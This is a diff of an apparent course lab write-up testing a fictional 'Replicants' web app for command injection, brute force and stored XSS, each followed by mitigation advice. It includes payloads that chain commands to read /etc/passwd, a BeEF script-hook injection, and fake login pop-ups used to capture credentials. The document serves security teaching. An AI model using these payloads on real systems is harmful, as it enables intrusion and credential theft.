@@ -6,7 +6,7 @@
 
 #### Web Application 1: *Your Wish is My Command Injection*
 
-**Launch the environment**
+**Launch the environment (Replicants Website) & testing  Command Injection Vulnerability** 
 
 1. Launch Vagrant from GitBash or the Mac terminal using the following command: `vagrant up`
 
@@ -58,17 +58,21 @@
 
 
 
-7. Now that we have determined that Replicants new application is vulnerable to command injection, we are tasked with using the dot-dot-slash method to design two payloads that will display the contents of the following files:
 
-   - `/etc/passwd`	
 
-   - `/etc/hosts`     
+----
 
-     
+**Now that we have determined that Replicants new application is vulnerable to command injection, we are tasked with using the dot-dot-slash method to design two payloads that will display the contents of the following files:**
 
----
+- `/etc/passwd`	
 
-**Solution** Input `8.8.8.8 && cat ../../../../../etc/hosts` to display the contents of the hosts file.
+- `/etc/hosts`     
+
+  
+
+#### Solution
+
+Input `8.8.8.8 && cat ../../../../../etc/hosts` to display the contents of the hosts file.
 
 -  [Solution (/etc/hosts)](./Images/hosts.png)
 
@@ -78,7 +82,7 @@ Input `8.8.8.8 && cat ../../../../../etc/passwd` to display the contents of the 
 
 
 
-**Mitigation**
+#### Mitigation
 
 Applications should run using the lowest privileges that are required to accomplish the necessary tasks. If possible, create isolated accounts with limited privileges that are only used for a single task. Avoid calling OS commands directly. Built-in library functions are a very good alternative to OS Commands, as they cannot be manipulated to  perform tasks other than those it is intended to do. Make sure you stay up-to-date with patches and updates. Additionally, you can use a web application firewall (WAF), which can  block suspicious traffic that may include attempted command injection. One of the simplest and most effective ways to prevent command  injections is to scan your application with a dynamic application  security testing (DAST) tool like Neuralegion’s Nexploit. 
 
@@ -116,15 +120,15 @@ Applications should run using the lowest privileges that are required to accompl
 
 
 
-2. Years ago, Replicants had a systems breach and several administrators passwords were stolen by a malicious hacker. The malicious hacker was only able to capture a list of passwords, not the associated accounts' usernames. Your manager is concerned that one of the administrators that accesses this new web application is using one of these compromised passwords. Therefore, there is a risk that the malicious hacker can use these passwords to access an administrator's account and view confidential data.
+Years ago, Replicants had a systems breach and several administrators passwords were stolen by a malicious hacker. The malicious hacker was only able to capture a list of passwords, not the associated accounts' usernames. Our manager is concerned that one of the administrators that accesses this new web application is using one of these compromised passwords. Therefore, there is a risk that the malicious hacker can use these passwords to access an administrator's account and view confidential data.
 
-   - Use the web application tool **Burp Suite**, specifically the **Burp Suite Intruder** feature, to determine if any of the administrator accounts are vulnerable to a brute force attack on this web application. 
+- Use the web application tool **Burp Suite**, specifically the **Burp Suite Intruder** feature, to determine if any of the administrator accounts are vulnerable to a brute force attack on this web application. 
 
-   - We've been provided with a list of administrators and the breached passwords:
+- We've been provided with a list of administrators and the breached passwords:
 
-     - [List of Administrators](Recourses/listofadmins.txt)
+  - [List of Administrators](Recourses/listofadmins.txt)
 
-     - [Breached list of Passwords](Recourses/breached_passwords.txt)
+  - [Breached list of Passwords](Recourses/breached_passwords.txt)
 
 
 
@@ -231,7 +235,7 @@ Applications should run using the lowest privileges that are required to accompl
 
 ---
 
-**Solution / Results**
+#### Solution / Results
 
 The Intruder Attack processed 100 requests and only one was successful as indicated in the [Intruder Attack Image](Images/bruteforce.png). (I sorted the results by `Length` to determine what attack was successful.)
 
@@ -253,43 +257,88 @@ To prevent brute force attacks I would recommend implementing Account Lockouts. 
 
 ### Web Application 3: *Where's the BeEF?*
 
+**Setup and Launching BeEF + Demonstration**  [Link to Document](./BeEF.md)
 
 
 
+Now that we know how to use the BeEF tool, we'll use it to test the Replicants web application. You are tasked with using a stored XSS attack to inject a BeEF hook into Replicants' main website.
+
+- Task details:
+
+  - The page you will test is the Replicants Stored XSS application which was used the first day of this unit: `http://192.168.13.25/vulnerabilities/xss_s/`
+  - The BeEF hook, which was returned after running the `sudo beef` command was: `http://127.0.0.1:3000/hook.js`
+  - The payload to inject with this BeEF hook is: `<script src="http://127.0.0.1:3000/hook.js"></script>`
+
+- When you attempt to inject this payload,  you will encounter a client-side limitation that will not allow you to enter the whole payload. You will need to find away around this limitation.    
+
+- Once you are able to hook into Replicants website, attempt a couple BeEF exploits. Some that work well include:
+
+  - Social Engineering >> Pretty Theft
+
+  - Social Engineering >> Fake Notification Bar
+
+  - Host >> Get Geolocation (Third Party)
+
+    
+
+---
+
+#### Solution/Results
 
 
 
+**Recap of Exploit and Environment Setup**
+
+1. Launch and Navigate to the BeEF HTML (Process demonstrated above) [BeEF and Terminal Image](Images/beef.png).
+
+2. Navigate to Replicants Website by using provided link in Task details
+
+   - `http://192.168.13.25/vulnerabilities/xss_s/` 
+   - Username: `admin` 
+   - Password: `password`
+
+   
+
+**Deploying the Exploit**
+
+On the Replicants Website we inject the payload `<script src="http://127.0.0.1:3000/hook.js"></script>`. Since we discovered that there is a limit of characters in the `Message*` field stating `maxlength="50"` we entered the Inspector with `Ctrl+Shift+I`- and changed the code to`maxlenght="100"` to ensure we can inject the payload [Message Element Inspector](Images/max50.png). (Replicants Website is successfully hoocked).
+
+Now we will attempt a **Social Engineering (Pretty Theft)** attack [Social Engineering Facebook](Images/facebook.png), navigating back to the Replicants Website to verify the attack was successful [Facebook Session Timed Out](Images/facebooklogin.png).
+
+Lets add a **Fake Notification Bar** to the attack [Notification Bar](Images/fnb.png) & verify if it was successful [Facebook Session Timed Out & Notification Bar](Images/fnb2.png).
+
+Next we will try to get the users login credentials by creating a fake Google login pop up [Google Phishing](Images/google.png), lets enter our test credentials [Test Credentials](Images/googlelogin.png) & verify if it worked [Google](Images/googlecred.png) (Command results show **data** ).
+
+Lastly we want to extract the Geolocation from the users [Get Geolocation (Third-Party)](Images/geo.png)
 
 
 
+#### Mitigation
+
+**Stored XSS**
+
+- **Filter input on arrival.** At the point where user input is received, filter as strictly as possible based on what is expected or valid input.  If you're going to accept form inputs, validating the data to ensure it meets specific criteria will be helpful.
+- **Encode data on output.** At the point where  user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. Depending on the  output context, this might require applying combinations of HTML, URL,  JavaScript, and CSS encoding.
+- **Use appropriate response headers.** To prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, you can use the `Content-Type` and `X-Content-Type-Options` headers to ensure that browsers interpret the responses in the way you intend.
+-  **Content Security Policy.** As a last line of defense, you can use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still occur.
+-  **Use a web application firewall (WAF).** Rules can be created on a WAF to specifically address XSS by blocking abnormal server requests. A robust WAF is a key component of your organization's security strategy, as it can also prevent SQL injection attacks, distributed denial-of-service attacks and other common threats.  Setting rules for your web applications defining how cookies are  handled can prevent XSS and even block JavaScript from accessing  cookies.                                
 
 
 
+**Social Engineering Attacks**
+
+- It’s important to **train your staff **so that they : Understand the consequences of social engineering attacks; Don’t open suspicious email attachments; Think before providing sensitive information (no one legitimate will ever ask you for your password, for instance); Beware of clickjacking (be suspicious of everything you click on and let your mouse hover over links to check where they’re pointing to) and many more important prevention techniques. 
+
+- As well as training your staff, it’s important to test the effectiveness of your training measures. **Simulated phishing attacks** will give you a good idea of your employees’ susceptibility to phishing emails.
+
+- Staff training is essential, but it’s not everything. You also need to  implement wider information security measures so that if attackers do  manage to trick users, it’s difficult for them to get much further.
+
+
+  The information security standard ISO 27001, which sets out the  requirements of a best-practice information security management system,  provides a lot of essential guidance relating to the suggestions above – and much more besides.
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+----
 
 
 
@@ -297,4 +346,6 @@ References:
 
 - https://www.neuralegion.com/blog/os-command-injection/
 - https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
+- https://portswigger.net/web-security/cross-site-scripting#stored-cross-site-scripting
+- https://www.grcelearning.com/blog/5-ways-to-mitigate-social-engineering-attacks
 
